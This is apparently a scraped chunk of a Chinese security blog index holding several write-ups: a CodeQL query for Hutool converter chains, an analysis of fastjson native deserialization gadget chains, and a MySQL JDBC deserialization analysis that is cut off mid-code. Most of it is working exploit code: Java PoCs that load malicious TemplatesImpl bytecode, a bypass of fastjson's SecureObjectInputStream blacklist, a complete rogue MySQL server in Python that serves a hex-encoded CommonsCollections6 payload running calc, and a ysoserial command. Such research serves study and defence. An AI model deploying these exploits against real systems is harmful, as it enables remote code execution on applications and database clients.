差不多就先这样吧\n其实我ql最初路走偏了，然后我就像通过call这种向上找（convert那个点），为什么不用tabby呢（我找出来很不全），\n然后我就去找AbstractConverter#convert会有哪些调用到，但是始终找不全，idea是有16个，tabby8个，ql始终是只有13个。然后去看ql是什么原因导致的。发现有个点位应该被找到的但是结果里面没有（见下图），DateConverter.convert这个点和下面TemporalAccessorConverter这个条件肯定是一样的。DateConverter是继承AbstractConverter\u0026lt;Date\u0026gt;是符合的，不知道为什么找不到，然后找了对应的类NumberWithFormat所有的caller点，也是没DateConverter.convert（感觉是数据库生成节点的问题啊，有大哥懂的，解答下小弟）\nimport java from RefType abstractConverter, RefType subclass,Method m,MethodCall mcall where (abstractConverter.getQualifiedName().matches(\u0026#34;cn.hutool.core.convert.Converter\u0026lt;%\u0026#34;) or abstractConverter.getQualifiedName().matches(\u0026#34;cn.hutool.core.convert.Converter\u0026#34;) )and subclass.getASupertype*() = abstractConverter and m.getDeclaringType()=subclass and m.hasName(\u0026#34;convert\u0026#34;) and mcall.getMethod()=m and (m.getDeclaringType().getQualifiedName().matches(\u0026#34;cn.hutool.core.convert.Converter%\u0026#34;) or m.getDeclaringType().getQualifiedName().matches(\u0026#34;cn.hutool.core.convert.AbstractConverter%\u0026#34;)) select m,m.getDeclaringType(),mcall,mcall.getEnclosingCallable().getDeclaringType() ","permalink":"https://Jiecub3.github.io/zh/posts/java/chain/fury%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96aliyunctf-jtool/","summary":"前言：当时看不懂这个，无意间看了下hessian反序列化，然后就有想法和思路了，然后看网上文章也是没有看到那个把这个讲明白的（也可能是我看得","title":"Fury反序列化\u0026aliyunctf-jtool"},{"content":" 分为2个版本来探究\n这里我们找的是原生链，及fastjson依赖下看看可反序列化的类，看有哪些可以用，这里查找只有这三个,1.2.49之后没这个AntiCollisionHashMap了\n环境\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.javassist\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;javassist\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.19.0-GA\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.48\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 1.2.48\u0026lt;= 0x01 分析 已知条件有JSON.toString-\u0026gt;JSON.toJSONString触发getter方法\n这里我们就是要分析怎么触发的getter方法\n跟进这里write()\n在下面这个write()中，会触发我们的getter，但是itemSerializer是一个根据我们传入的类，动态生成的一个ObjectSerializer对象\n则我们跟进serializer.getObjectWriter看看怎么创造的\n在ASMSerializerFactory#createJavaBeanSerializer中会对这个Class进行创造，并实例化生成对象返回\n这里我们直接获取最终的byte[]还原这个class\nimport java.io.FileOutputStream; import java.io.IOException; import java.util.Base64; public class SaveClassFile { public static void saveClassFile(String className, byte[] code) { // 定义文件路径和名称 String fileName = className + \u0026#34;.class\u0026#34;; try (FileOutputStream fos = new FileOutputStream(fileName)) { // 将字节数组写入文件 fos.write(code); System.out.println(\u0026#34;Class file saved: \u0026#34; + fileName); } catch (IOException e) { e.printStackTrace(); } } public static void main(String[] args) { // 示例：假设你已经有一个 byte[] code String base64=\u0026#34;yv66vgAAADEA5gEAPWNvb...\u0026#34;; byte[] code = Base64.getDecoder().decode(base64); String className = \u0026#34;ser\u0026#34;; saveClassFile(className, code); } } 还原出来张下面这个样子，其write方法中，经过不完整调试会进入else调用下面的getOutputProperties()\n然后关于FieldInfo的值的获取，这个关系到会调用哪些getter，这里简单提一嘴吧\ncomputeGetters()方法里，会对该类的所有方法进行处理，并提取get和is开头的方法\nif(methodName.startsWith(\u0026#34;get\u0026#34;)){ if(methodName.startsWith(\u0026#34;is\u0026#34;)){ 然后这些提取的FieldInfo则存储在fields中了\n然后整条链子就没什么难度了，通过BadAttributeValueExpException触发toString就行\n0x02 poc getter调用是通过触发JSON#toString实现的，JSON这里是抽象类，然后他有两个继承类JSONArray，JSONArray\nMap\u0026lt;String, Object\u0026gt; map = new HashMap\u0026lt;\u0026gt;(); map.put(\u0026#34;sd\u0026#34;, templates); JSONObject objects = new JSONObject(map); import com.alibaba.fastjson.JSONArray; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import javassist.CtClass; import javassist.NotFoundException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.Base64; public class Learn { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); byte[] code = clazz.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\u0026#34;_name\u0026#34;,\u0026#34;111\u0026#34;); setFiled(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); JSONArray objects = new JSONArray(); objects.add(templates); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); Constructor\u0026lt;?\u0026gt; o = aClass.getDeclaredConstructor(Object.class); o.setAccessible(true); Object o1 = o.newInstance(11); Field val = aClass.getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(o1, objects); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(o1); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } private static void setFiled(TemplatesImpl templates, String name, Object number) throws NoSuchFieldException, IllegalAccessException { Field declaredField = TemplatesImpl.class.getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,number); } } 1.2.49\u0026ndash;\u0026gt;2.0.26 1.2.49之后，JSONObject新增了SecureObjectInputStream来处理JSONObject和JSONArray的readObject()反序列化，其中增加了resolveClass和resolveProxyClass会对相关的普通类以及代理类的接口类进行检测\n这里黑名单检测出com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\n这里利用思路，是因为SecureObjectInputStream只会处理JSON2相关的反序列化(这里JSON2代表JSONObject和JSONArray，后面都这样表示懒得写了)，这让我们有了操作的空间\n什么意思呢，这里写了一个小demo供大家理解，这里TemplatesImpl和JdbcRowSetImpl都是黑名单的，而这里只有add到JSONArray的JdbcRowSetImpl会被SecureObjectInputStream处理，而TemplatesImpl则是正常的ObjectInputStream的处理，则不会被检测。\nimport com.alibaba.fastjson.JSONArray; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.rowset.JdbcRowSetImpl; import javax.xml.transform.Templates; import javax.xml.transform.Transformer; import javax.xml.transform.TransformerConfigurationException; import java.io.*; import java.net.URL; import java.util.ArrayList; import java.util.Properties; public class test_ser { public static void main(String[] args) throws Exception { TemplatesImpl templates=new TemplatesImpl(); JdbcRowSetImpl url= new JdbcRowSetImpl(); JSONArray objects = new JSONArray(); objects.add(url); ArrayList\u0026lt;Object\u0026gt; arrayList = new ArrayList\u0026lt;\u0026gt;(); arrayList.add(templates); arrayList.add(objects); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(arrayList); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } } 其实当时看感觉开发处理的很好，因为这种不会影响到正常的反序列化，局部的进行了检测。\n然后还有一点，我们要利用TemplatesImpl肯定是要放到ArrayList中的，那上面有什么用呢，待我慢慢道来\n这是因为，java反序列化中为了提高效率，反序列化过一次的对象会放到一个类似Map的参数中，下一次反序列化到这个对象时，则会直接从这个Map中获取对应的对象，而不会再走第一次处理反序列化的流程，而resolveClass的处理是在第一次反序列化中进行检测的，并不会在第二次中进行检测\n所以我们先通过ObjectInputStream帮我们实现第一次反序列化，第一次反序列化检测的是ObjectInputStream#resolveClass并不会对我们的类照成影响，而SecureObjectInputStream处理的是第二次反序列化则实现了绕过SecureObjectInputStream#resolveClass\n这问题其实也跟java反序列化的调用处理有很大关系hhh，如果没这个机制的话，其实开发这样写没什么问题，我们看看java反序列化中是怎么处理的\njava反序列化 readObject0这里会有一个switch处理，然后进行对应的反序列化处理\n先看看正常流程吧，正常类是进入\ncase TC_OBJECT:--\u0026gt;readOrdinaryObject()--\u0026gt;readClassDesc(false)--\u0026gt;case TC_CLASSDESC: --\u0026gt;readNonProxyDesc()--\u0026gt;resolveClass() //触发检测 然后我们是要避免检测的，如果从readClassDesc()出发的话，其实只剩TC_REFERENCE可以看看了\nTC_NULL是返回null的\nTC_PROXYCLASSDESC是处理代理类的，而代理类，SecureObjectInputStream也是做了检测的\n而TC_REFERENCE正是处理已经反序列化过的类，这里的TC_REFERENCE其实和readObject0中TC_REFERENCE处理是一样的。往上推也就是说我们要避免readClassDesc()方法，那么其实readObject0就只剩TC_REFERENCE的调用了，查看对应readHandle()方法\n这里handles.lookupObject获取handles.entries中对应的对象,并return。那我们再看看这些值是怎么添加进去的\nhandles.entries的值一般通过下图中，handles.assign添加\n上图就是正常处理完反序列化后，将反序列化后的对象存储到handles中，方便第二次处理同一个类时直接调用\nint assign(Object obj) { if (size \u0026gt;= entries.length) { grow(); } status[size] = STATUS_UNKNOWN; entries[size] = obj; return size++; } 然后就是poc环节啦\npoc ArrayList\u0026lt;Object\u0026gt; arrayList = new ArrayList\u0026lt;\u0026gt;(); arrayList.add(templates); arrayList.add(o1); 这里主要就是先让ObjectInputStream将TemplatesImpl反序列化一次，再交给SecureObjectInputStream处理，然后case那些byte，java序列化会帮我们完成。当然这里不止list，只要是可以存储多个对象的都可以，然后让TemplatesImpl先反序列化即可\nimport com.alibaba.fastjson.JSONArray; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassPool; import javassist.CtClass; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.ArrayList; import java.util.Base64; public class Learn2 { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(Evil.class.getName()); byte[] code = clazz.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); TemplatesImpl templates=new TemplatesImpl(); setFiled(templates,\u0026#34;_name\u0026#34;,\u0026#34;111\u0026#34;); setFiled(templates,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); JSONArray objects = new JSONArray(); objects.add(templates); Class\u0026lt;?\u0026gt; aClass = Class.forName(\u0026#34;javax.management.BadAttributeValueExpException\u0026#34;); Constructor\u0026lt;?\u0026gt; o = aClass.getDeclaredConstructor(Object.class); o.setAccessible(true); Object o1 = o.newInstance(11); Field val = aClass.getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(o1, objects); ArrayList\u0026lt;Object\u0026gt; arrayList = new ArrayList\u0026lt;\u0026gt;(); arrayList.add(templates); arrayList.add(o1); FileOutputStream fos = new FileOutputStream(\u0026#34;bin\u0026#34;); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(arrayList); oos.close(); // 从文件中反序列化对象 FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); ois.readObject(); ois.close(); } private static void setFiled(TemplatesImpl templates, String name, Object number) throws NoSuchFieldException, IllegalAccessException { Field declaredField = TemplatesImpl.class.getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,number); } } 安全检测 那怎么样是安全的呢，其实上面的原因就是，不是所有第一次反序列化的累都进行了resolveClass检测\n那怎么才安全，下方及通过SafeObjectInputStream包装，再readObject就全部都进行resolveClass检测了\n而在fastjson中及通过SecureObjectInputStream包装，但是貌似开发不是这样想，因为我反射去调用这个来包装反序列化时会空指针报错，那开发思路应该是应用更方便来的，不如的话每个反序列化都需要SecureObjectInputStream包装，修改以前代码工程量应该不小hhh\npublic class SafeObjectInputStream extends ObjectInputStream { public SafeObjectInputStream(InputStream in) throws IOException { super(in); } @Override protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); if (className.equals(\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;)) { throw new SecurityException(\u0026#34;Deserialization of TemplatesImpl is not allowed!\u0026#34;); } return super.resolveClass(desc); } } FileInputStream fis = new FileInputStream(\u0026#34;bin\u0026#34;); ObjectInputStream ois = new SafeObjectInputStream(fis); ois.readObject(); ois.close(); 参考\nhttps://www.cnpanda.net/sec/893.html\nhttps://www.cnpanda.net/sec/928.html\nhttps://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/\n","permalink":"https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/","summary":"分为2个版本来探究 这里我们找的是原生链，及fastjson依赖下看看可反序列化的类，看有哪些可以用，这里查找只有这三个,1.2.49之后没这","title":"Fastjson原生链"},{"content":"0x1 Mysql 反序列化 前言：java调试这边分析完了，但是又很想了解这个mysql恶意服务是怎么搭建的，于是就再从流量层面简单分析了下mysql协议，以及按照自己的思路改造了下mysql恶意服务。感觉有了跟深刻的理解hh\n环境\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;mysql\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mysql-connector-java\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.0.12\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 客户端\npackage mysql; import java.sql.*; public class mysql_learn { public static void main(String[] args) throws Exception { String ClassName = \u0026#34;com.mysql.jdbc.Driver\u0026#34;; String JDBC_Url = \u0026#34;jdbc:mysql://127.0.0.1:3307/newtest?autoDeserialize=true\u0026amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026#34;; String username = \u0026#34;root\u0026#34;; String password = \u0026#34;123456\u0026#34;; Class.forName(ClassName); Connection connection = DriverManager.getConnection(JDBC_Url,username,password); // Connection connection = DriverManager.getConnection(JDBC_Url); } } 恶意mysql服务器\nimport socket import binascii import os greeting_data=\u0026#34;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400\u0026#34; response_ok_data=\u0026#34;0700000200000002000000\u0026#34; def receive_data(conn): data = conn.recv(1024) print(\u0026#34;[*] Receiveing the package : {}\u0026#34;.format(data)) return str(data).lower() def send_data(conn,data): print(\u0026#34;[*] Sending the package : {}\u0026#34;.format(data)) conn.send(binascii.a2b_hex(data)) def get_payload_content(): #file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] \u0026gt; payload file= r\u0026#39;C:\\\\Users\\\\jie\\\\Desktop\\\\learn\\\\java\\\\TOOLS\\\\ser.bin\u0026#39; if os.path.isfile(file): with open(file, \u0026#39;rb\u0026#39;) as f: payload_content = str(binascii.b2a_hex(f.read()),encoding=\u0026#39;utf-8\u0026#39;) print(\u0026#34;open successs\u0026#34;) else: print(\u0026#34;open false\u0026#34;) #calc payload_content=\u0026#39;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878\u0026#39; return payload_content # 主要逻辑 def run(): while 1: conn, addr = sk.accept() print(\u0026#34;Connection come from {}:{}\u0026#34;.format(addr[0],addr[1])) # 1.先发送第一个 问候报文 send_data(conn,greeting_data) while True: # 登录认证过程模拟 1.客户端发送request login报文 2.服务端响应response_ok receive_data(conn) send_data(conn,response_ok_data) #其他过程 data=receive_data(conn) #查询一些配置信息,其中会发送自己的 版本号 if \u0026#34;session.auto_increment_increment\u0026#34; in data: _payload=\u0026#39;01000001112e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c21000c000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c21002d000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c21002a000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000001e00000e036465660000000873716c5f6d6f6465000c21005f010000fd00001f00002600000f036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000010036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001103646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000012036465660000000c776169745f74696d656f7574000c3f001500000008a000000000e9000013013104757466380475746638047574663804757466380f757466385f756e69636f64655f63690e534554204e414d45532075746638033132300347504c0131083136373737323136023630754f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d524541440331323007000014fe000002000000\u0026#39; send_data(conn,_payload) data=receive_data(conn) elif \u0026#34;show warnings\u0026#34; in data: _payload = \u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000\u0026#39; send_data(conn, _payload) data = receive_data(conn) if \u0026#34;set names\u0026#34; in data: send_data(conn, response_ok_data) data = receive_data(conn) if \u0026#34;set character_set_results\u0026#34; in data: send_data(conn, response_ok_data) data = receive_data(conn) if \u0026#34;session.autocommit\u0026#34; in data: autocommit_result=\u0026#39;01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000002000003013107000004fe000002000000\u0026#39; send_data(conn, autocommit_result) data = receive_data(conn) if \u0026#34;show session status\u0026#34; in data: mysql_data=\u0026#39;0100000102360000020364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374730269640269640c3f000b000000030342000000540000030364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374731173657269616c697a65645f6f626a6563741173657269616c697a65645f6f626a6563740c3f00ffff0000fc9000000000060500040131fc0105aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000863616c632e657865740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f400000000000007708000000100000000078787807000005fe000002000000\u0026#39; #mysql_data是测试 返回SHOW SESSION STATUS结果 的原始数据流 payload_content=get_payload_content() payload_length = str(hex(len(payload_content)//2)).replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;).zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] data_len = str(hex(len(payload_content)//2 + 5)).replace(\u0026#39;0x\u0026#39;, \u0026#39;\u0026#39;).zfill(4) data_len_hex = data_len[2:4] + data_len[0:2] mysql_data2=\u0026#39;0100000102360000020364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374730269640269640c3f000b000000030342000000540000030364656604746573740c6a6176615f6f626a656374730c6a6176615f6f626a656374731173657269616c697a65645f6f626a6563741173657269616c697a65645f6f626a6563740c3f00ffff0000fc9000000000\u0026#39; mysql_data2=mysql_data2+data_len_hex+\u0026#39;0004\u0026#39;+\u0026#39;0131\u0026#39;+\u0026#39;fc\u0026#39;+payload_length_hex+payload_content mysql_data2+=\u0026#39;07000005fe000002000000\u0026#39; send_data(conn, mysql_data2) data = receive_data(conn) if \u0026#34;show warnings\u0026#34; in data: payload = \u0026#39;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000\u0026#39; send_data(conn, payload) break if __name__ == \u0026#39;__main__\u0026#39;: HOST =\u0026#39;0.0.0.0\u0026#39; PORT = 3307 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间 sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(\u0026#34;start fake mysql server listening on {}:{}\u0026#34;.format(HOST,PORT)) run() ● 编写反序列化的恶意数据到文件 ser.bin 中\njava -jar ysoserial.jar CommonsCollections6 calc.exe \u0026gt; ser.bin 0x01 分析 queryInterceptors 这里我想先反着来，先理解poc中这个设置ServerStatusDiffInterceptor，为什么设置这个\nqueryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor 我们知道mysql打的是反序列化，前辈挖可能也是根据readObject定位。\n根据getObject往上则找到ServerStatusDiffInterceptor这个类\n我们后面再说这个咋调用的。\n开头 现在我从DriverManager.getConnection开始调试分析整个流程！（中间部分调试，我觉得沉余就省略了\n这里直接到ConnectionUrl.getConnectionUrlInstance这个地方会对我们传入的url(JDBC_Url)进行分类封装。\n然后到ConnectionImpl，这里会初始化我们设置的queryInterceptors值，o.init会调用ServerStatusDiffInterceptor#init\n然后包装成一个Arraylist存储到this.queryInterceptors中\n然后client端这边想执行一个SET autocommit=1语句\n然后我们看后面是怎么执行的\nNativeProtocol#sendQueryPacket\n这里发现会判断是否有设置queryInterceptors拦截器，有的话会通过这个拦截器完成执行SET autocommit=1这个任务(没有的话，就直接发送这个请求给mysql服务器，执行这条sql语句并返回值)\n然后一路到调用这个拦截器的preProcess()方法\n而ServerStatusDiffInterceptor#preProcess正是调用populateMapWithSessionStatusValues()方法，于是利用点也就穿起来了\npublic \u0026lt;T extends Resultset\u0026gt; T preProcess(Supplier\u0026lt;String\u0026gt; sql, Query interceptedQuery) { populateMapWithSessionStatusValues(this.preExecuteValues); return null; // we don\u0026#39;t actually modify a result set } 本来是要执行SET autocommit=1，结果ServerStatusDiffInterceptor转头执行了个SHOW SESSION STATUS，并处理这个返回的结果（利用点也出在）\nSHOW SESSION STATUS 执行结果\nSHOW SESSION STATUS 执行结果其实也就是相当于select * from table(table是两个字段的)\n下面rs.getObject(1), rs.getObject(2)就是获取第一个字段，第二个字段\nautoDeserialize 然后就到了最终利用点，这里数据类型得是BLOB，然后这里也是为什么要设置autoDeserialize(true可以用1绕过)，其实BIT类型也有readobject，但是我搜索的时候bit长度不能太长(这个没去验证)，但是序列化数据是需要长度的，所以这里用BLOB\n上述就是调试的整个流程\n0x02 mysql恶意服务构造 package mysql; import java.sql.Connection; import java.sql.DriverManager; import java.sql.ResultSet; import java.sql.Statement; public class contect_test { public static void main(String[] args) throws Exception{ String Driver = \u0026#34;com.mysql.cj.jdbc.Driver\u0026#34;; String DB_URL = \u0026#34;jdbc:mysql://127.0.0.1:3306/newtest?characterEncoding=utf8\u0026amp;useSSL=false\u0026amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026amp;autoDeserialize=true\u0026#34;; Class.forName(Driver); Connection conn = 